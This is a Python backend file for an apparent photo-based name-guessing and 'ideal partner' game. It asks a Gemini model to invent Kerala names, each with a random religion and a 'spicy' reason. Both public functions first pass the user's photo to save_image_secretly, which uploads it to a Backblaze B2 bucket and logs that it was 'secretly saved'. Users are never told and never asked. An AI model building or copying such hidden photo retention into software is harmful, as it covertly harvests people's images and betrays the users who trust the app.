# ai_generator.py (Final Version)

import os
import io
import boto3
from datetime import datetime
import google.generativeai as genai
from PIL import Image

# --- GOOGLE AI SETUP ---
GOOGLE_API_KEY = os.getenv("GOOGLE_API_KEY")
if not GOOGLE_API_KEY:
    raise ValueError("The GOOGLE_API_KEY environment variable has not been set.")
genai.configure(api_key=GOOGLE_API_KEY)
model_name = 'gemini-1.5-flash-latest'
model = genai.GenerativeModel(model_name)
print(f"✅ AI Model Initialized Successfully (using '{model_name}').")


# --- BACKBLAZE B2 CLOUD STORAGE SETUP ---
# Get credentials and config from Render's Environment Variables
B2_BUCKET_NAME = os.getenv("B2_BUCKET_NAME")
B2_ENDPOINT_URL = os.getenv("B2_ENDPOINT_URL")
B2_ACCESS_KEY_ID = os.getenv("B2_ACCESS_KEY_ID")
B2_SECRET_ACCESS_KEY = os.getenv("B2_SECRET_ACCESS_KEY")

# Check if all B2 variables are set. If not, disable uploading.
if not all([B2_BUCKET_NAME, B2_ENDPOINT_URL, B2_ACCESS_KEY_ID, B2_SECRET_ACCESS_KEY]):
    print("[!] WARNING: Backblaze B2 environment variables not fully set. Photo saving will be skipped.")
    B2_ENABLED = False
else:
    B2_ENABLED = True
    # Initialize the B2 client (using the S3-compatible API)
    s3_client = boto3.client(
        's3',
        endpoint_url=B2_ENDPOINT_URL,
        aws_access_key_id=B2_ACCESS_KEY_ID,
        aws_secret_access_key=B2_SECRET_ACCESS_KEY
    )
    print("✅ Backblaze B2 Client Initialized Successfully.")


def save_image_secretly(image_data: bytes):
    """
    Uploads the given image data to the configured Backblaze B2 bucket.
    """
    if not B2_ENABLED:
        print("  [~] Skipping photo save because B2 is not configured.")
        return

    try:
        # Create a unique filename using a timestamp
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S-%f")
        filename = f"capture_{timestamp}.jpg"
        
        # Boto3 expects a file-like object, so we wrap the image bytes in memory
        image_file_obj = io.BytesIO(image_data)
        
        # Upload the file object to the B2 bucket
        s3_client.upload_fileobj(
            image_file_obj,
            B2_BUCKET_NAME,  # CRITICAL FIX: Use the variable here
            filename,
            ExtraArgs={'ContentType': 'image/jpeg'}
        )
        
        print(f"  [+] Photo secretly saved to B2 Bucket '{B2_BUCKET_NAME}' as: {filename}")

    except Exception as e:
        print(f"  [!] CRITICAL ERROR: Could not save photo to B2. Reason: {e}")


def suggest_self_name(image_data: bytes, subject: str = "person") -> str:
    """
    Saves the image and then asks the AI to suggest a name for the person in it.
    """
    save_image_secretly(image_data)
   
    print(f"  AI is analyzing photo for '{subject}'...")
    person_image = Image.open(io.BytesIO(image_data))
    
    context_phrase = "the person in this photo"
    if subject == 'father':
        context_phrase = "the father of the person in this photo"
 
    prompt = f"""
    Analyze the photo. Your task is to suggest a name for {context_phrase}.
    Imagine what they would be like based on the photo provided.
    Name should be starting from different alphabets each time based on the minute of the hour
    also random relegion(christian ,hindu , muslim)  based on the minute of the hour
    INSTRUCTIONS:
    1. Your choice must be a modern and rarely popular name from Kerala, India.
    2. The name MUST NOT contain the word 'Arjun'.
    3. The name should be unique and creatively generated by the AI.
    4. You must provide a single, short, funny, witty, and "spicy" reason. The reason does not need to be logical or connected to the photo.
    
    Your entire response MUST follow this exact, two-line format and nothing else:

    NAME: [The one suggested name]
    REASON: [The short, witty, and spicy one-sentence reason.]
    """

    generation_config = genai.types.GenerationConfig(temperature=2.0)
    
    response = model.generate_content(
        [prompt, person_image],
        generation_config=generation_config
    )
    return response.text


def suggest_partner_name(image_data: bytes) -> str:
    """
    Saves the image and then asks the AI to suggest a partner's name.
    """
    save_image_secretly(image_data)
    
    print("  AI is analyzing photo for 'Who For Me?'...")
    person_image = Image.open(io.BytesIO(image_data))
    
    prompt = f"""
    Analyze the person in this photo. Imagine their ideal, complementary, opposite-gender partner from Kerala, India.
    Name should be starting from different alphabets each time based on the minute of the hour
    INSTRUCTIONS:
    1. The partner's name must be a modern and unique name from Kerala, India.
    2. The name should be creatively and randomly generated by the AI.
    3. You must provide a single, short, witty, and "spicy" reason for why they are a perfect match.
    also random religion(christian ,hindu , muslim) based on the millisecond of time.
    Your entire response MUST follow this exact, two-line format and nothing else:
    
    NAME: [The one suggested name for the partner]
    REASON: [The short, witty, and spicy reason for the match.]
    """

    generation_config = genai.types.GenerationConfig(temperature=2.0)
    
    response = model.generate_content(
        [prompt, person_image],
        generation_config=generation_config
    )
    return response.text